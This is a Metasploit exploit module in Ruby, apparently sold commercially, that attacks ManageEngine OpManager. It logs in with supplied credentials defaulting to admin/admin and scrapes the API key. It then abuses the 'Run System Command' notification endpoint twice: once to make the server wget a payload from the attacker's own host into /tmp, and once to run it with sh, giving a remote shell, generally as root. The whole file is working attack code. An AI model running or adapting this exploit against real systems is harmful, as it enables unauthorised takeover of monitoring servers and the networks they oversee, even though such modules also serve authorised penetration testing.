##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'ManageEngine OpManager Authenticated Remote Command Execution',
      'Description' => %q{
    This module uses intended administrative functionality in order to
    gain a remote shell.

    This module exploits intended administrative functionality in order
    to gain a remote shell on the ManageEngine instance, generally as root.
    Administrators have the ability to create notifications that run system
    commands when certain criteria is met.

    Categories: Enterprise

    Price: 9

    Video: https://asciinema.org/a/T6TJCRRTzW1wODfMhBtNXaKmi

    OS: Linux

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
        ],
      'Privileged' => false,
      'Platform'   => ['linux', 'unix'],
      'Arch'       => ARCH_CMD,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
         OptString.new('TARGETURI', [ true, "Base OpManager path", '/']),
         OptString.new('USERNAME', [true, 'The username to authenticate with', 'admin']),
         OptString.new('PASSWORD', [true, 'The password to authenticate with', 'admin'])
      ], self.class)
  end

  def exploit
    @sent = false
    uri = Rex::Text.rand_text_alpha(5)
    start_service({'Uri' => {
      'Proc' => Proc.new {|cli,req|
                         on_request_uri(cli,req)
    },
    'Path' => "/#{uri}"
    }})
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/apiclient/ember/Login.jsp')
    })

    cookie = res.get_cookies

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/servlets/SettingsServlet?requestType=AJAX'),
      'vars_post' => {
        'EncryptPassword' => datastore['PASSWORD']
      }
    })

    hash = res.body

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/apiclient/ember/j_security_check'),
      'vars_post' => {
        'AUTHRULE_NAME' => 'Authenticator',
        'clienttype' => 'html',
        'ScreenWidth' => 1234,
        'ScreenHeight' => 1234,
        'loginFromCookieData' => false,
        'ntlmv2' => false,
        'j_username' => datastore['USERNAME'],
        'j_password' => datastore['PASSWORD'],
      },
      'cookie' => cookie
    })

    if res.code != 303
      fail_with(Failure::Unknown, 'Authentication failed')
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/apiclient/ember/Login.jsp'),
      'cookie' => cookie
    })

    cookie = res.get_cookies

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/apiclient/ember/index.jsp'),
      'cookie' => cookie
    })

    apikey = $1 if res.body =~ /window.OPM.apiKey = "(.*?)"; \/\/No I18N/

    file = Rex::Text.rand_text_alpha(8)

    print_good("Downloading #{file} to /tmp")
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/api/json/admin/testNProfile?apiKey=' + apikey),
      'method' => 'POST',
      'vars_post' => {
        'command' => 'wget -O /tmp/'+file+' http://' + datastore['LHOST']+':'+datastore['SRVPORT'].to_s+'/' + uri,
        'profileType' => 'Run System Command',
        'name' => Rex::Text.rand_text_alpha(8)
      },
      'cookie' => cookie
    })

    while !@sent
      select(nil,nil,nil, 5)
    end

    stop_service

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/api/json/admin/testNProfile?apiKey=' + apikey),
      'method' => 'POST',
      'vars_post' => {
        'command' => 'sh /tmp/'+file,
        'profileType' => 'Run System Command',
        'name' => Rex::Text.rand_text_alpha(8)
      },
      'cookie' => cookie
    })

    select(nil,nil,nil,5)
  end

  def on_new_session(session)
    @done = true
  end

  def on_request_uri(cli, request)
    print_good("Sending payload")
    send_response(cli,payload.encoded)
    @sent = true
  end

end
